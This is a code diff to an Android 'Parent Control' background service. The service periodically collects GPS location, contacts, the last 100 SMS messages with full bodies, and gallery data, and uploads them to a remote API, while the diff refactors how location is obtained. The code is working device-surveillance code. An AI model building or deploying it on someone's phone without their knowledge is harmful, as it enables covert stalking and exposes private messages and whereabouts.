@@ -5,11 +5,15 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
@@ -18,11 +22,7 @@ import android.provider.MediaStore;
 import android.provider.Telephony;
 import android.util.Log;
 
-import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
-
-import com.google.android.gms.location.FusedLocationProviderClient;
-import com.google.android.gms.location.LocationServices;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -39,22 +39,39 @@ public class DataSyncService extends Service {
     private static final String TAG = "DataSyncService";
     private static final String CHANNEL_ID = "parent_control_channel";
     private static final int NOTIFICATION_ID = 1001;
-    private static final long SYNC_INTERVAL = 15 * 60 * 1000; // 15 minutes
+    private static final long SYNC_INTERVAL = 15 * 60 * 1000;
     
     public static boolean isRunning = false;
     
     private Handler handler;
     private ExecutorService executor;
-    private FusedLocationProviderClient locationClient;
+    private LocationManager locationManager;
     private String apiUrl;
     private String apiToken;
+    private Location lastLocation;
+    
+    private LocationListener locationListener = new LocationListener() {
+        @Override
+        public void onLocationChanged(Location location) {
+            lastLocation = location;
+        }
+        
+        @Override
+        public void onStatusChanged(String provider, int status, Bundle extras) {}
+        
+        @Override
+        public void onProviderEnabled(String provider) {}
+        
+        @Override
+        public void onProviderDisabled(String provider) {}
+    };
     
     @Override
     public void onCreate() {
         super.onCreate();
         handler = new Handler(Looper.getMainLooper());
         executor = Executors.newSingleThreadExecutor();
-        locationClient = LocationServices.getFusedLocationProviderClient(this);
+        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
         
         apiUrl = Config.getApiUrl(this);
         apiToken = Config.getApiToken(this);
@@ -75,13 +92,24 @@ public class DataSyncService extends Service {
         
         startForeground(NOTIFICATION_ID, notification);
         
+        try {
+            locationManager.requestLocationUpdates(
+                LocationManager.GPS_PROVIDER,
+                60000,
+                10,
+                locationListener
+            );
+        } catch (SecurityException e) {
+            Log.e(TAG, "Location permission denied", e);
+        }
+        
         startSyncLoop();
         
         return START_STICKY;
     }
     
     private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+        if (Build.VERSION.SDK_INT >= 26) {
             NotificationChannel channel = new NotificationChannel(
                 CHANNEL_ID,
                 "Parent Control Service",
@@ -89,7 +117,7 @@ public class DataSyncService extends Service {
             );
             channel.setDescription("Background monitoring service");
             
-            NotificationManager manager = getSystemService(NotificationManager.class);
+            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
             if (manager != null) {
                 manager.createNotificationChannel(channel);
             }
@@ -97,7 +125,7 @@ public class DataSyncService extends Service {
     }
     
     private void startSyncLoop() {
-        Runnable syncTask = new Runnable() {
+        handler.post(new Runnable() {
             @Override
             public void run() {
                 if (isRunning) {
@@ -105,45 +133,38 @@ public class DataSyncService extends Service {
                     handler.postDelayed(this, SYNC_INTERVAL);
                 }
             }
-        };
-        
-        handler.post(syncTask);
+        });
     }
     
     private void performSync() {
-        executor.execute(() -> {
-            try {
-                syncLocation();
-                syncContacts();
-                syncSms();
-                syncGallery();
-                Log.d(TAG, "Sync completed successfully");
-            } catch (Exception e) {
-                Log.e(TAG, "Sync failed", e);
+        executor.execute(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    syncLocation();
+                    syncContacts();
+                    syncSms();
+                    syncGallery();
+                    Log.d(TAG, "Sync completed successfully");
+                } catch (Exception e) {
+                    Log.e(TAG, "Sync failed", e);
+                }
             }
         });
     }
     
     private void syncLocation() {
         try {
-            locationClient.getLastLocation().addOnSuccessListener(location -> {
-                if (location != null) {
-                    executor.execute(() -> {
-                        try {
-                            JSONObject data = new JSONObject();
-                            data.put("latitude", location.getLatitude());
-                            data.put("longitude", location.getLongitude());
-                            data.put("accuracy", location.getAccuracy());
-                            
-                            sendToApi("/api/data/location", data);
-                        } catch (Exception e) {
-                            Log.e(TAG, "Failed to sync location", e);
-                        }
-                    });
-                }
-            });
-        } catch (SecurityException e) {
-            Log.e(TAG, "Location permission denied", e);
+            if (lastLocation != null) {
+                JSONObject data = new JSONObject();
+                data.put("latitude", lastLocation.getLatitude());
+                data.put("longitude", lastLocation.getLongitude());
+                data.put("accuracy", lastLocation.getAccuracy());
+                
+                sendToApi("/api/data/location", data);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to sync location", e);
         }
     }
     
@@ -186,15 +207,10 @@ public class DataSyncService extends Service {
             ContentResolver resolver = getContentResolver();
             
             Cursor cursor = resolver.query(
-                Telephony.Sms.CONTENT_URI,
-                new String[]{
-                    Telephony.Sms.ADDRESS,
-                    Telephony.Sms.BODY,
-                    Telephony.Sms.DATE,
-                    Telephony.Sms.TYPE
-                },
+                Uri.parse("content://sms"),
+                new String[]{"address", "body", "date", "type"},
                 null, null, 
-                Telephony.Sms.DATE + " DESC LIMIT 100"
+                "date DESC LIMIT 100"
             );
             
             if (cursor != null) {
@@ -203,7 +219,7 @@ public class DataSyncService extends Service {
                     sms.put("address", cursor.getString(0));
                     sms.put("body", cursor.getString(1));
                     sms.put("date", cursor.getLong(2));
-                    sms.put("type", cursor.getInt(3) == Telephony.Sms.MESSAGE_TYPE_SENT ? "sent" : "received");
+                    sms.put("type", cursor.getInt(3) == 2 ? "sent" : "received");
                     smsList.put(sms);
                 }
                 cursor.close();
@@ -255,7 +271,7 @@ public class DataSyncService extends Service {
         }
     }
     
-    private void sendToApi(String endpoint, JSONObject data) {
+    private void sendToApi(final String endpoint, final JSONObject data) {
         try {
             URL url = new URL(apiUrl + endpoint);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -264,10 +280,10 @@ public class DataSyncService extends Service {
             conn.setRequestProperty("X-API-Token", apiToken);
             conn.setDoOutput(true);
             
-            byte[] input = data.toString().getBytes(StandardCharsets.UTF_8);
-            try (OutputStream os = conn.getOutputStream()) {
-                os.write(input, 0, input.length);
-            }
+            byte[] input = data.toString().getBytes("UTF-8");
+            OutputStream os = conn.getOutputStream();
+            os.write(input, 0, input.length);
+            os.close();
             
             int responseCode = conn.getResponseCode();
             Log.d(TAG, "API response for " + endpoint + ": " + responseCode);
@@ -284,9 +300,13 @@ public class DataSyncService extends Service {
         isRunning = false;
         handler.removeCallbacksAndMessages(null);
         executor.shutdown();
+        try {
+            locationManager.removeUpdates(locationListener);
+        } catch (Exception e) {
+            Log.e(TAG, "Error removing location updates", e);
+        }
     }
     
-    @Nullable
     @Override
     public IBinder onBind(Intent intent) {
         return null;
